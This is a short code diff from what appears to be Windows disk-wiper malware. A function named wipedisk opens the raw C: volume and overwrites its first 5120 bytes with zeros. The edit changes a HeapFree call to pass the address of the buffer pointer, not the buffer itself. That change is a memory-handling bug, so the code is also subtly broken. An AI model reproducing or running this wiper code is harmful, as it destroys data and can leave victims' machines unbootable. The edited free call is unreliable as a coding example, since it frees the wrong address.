@@ -110,7 +110,7 @@ DWORD WINAPI wipedisk(_In_ LPVOID lpParam)
 	HANDLE HDiskC = CreateFileW(L"\\\\.\\C:", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 	SetFilePointer(HDiskC, 0, NULL, FILE_BEGIN);
 	WriteFile(HDiskC, zero, 5120, &wipeC, NULL);
-	HeapFree(GetProcessHeap(), NULL, zero);
+	HeapFree(GetProcessHeap(), NULL, &zero);
 	CloseHandle(HDiskC);
 
 	DWORD wipe0;
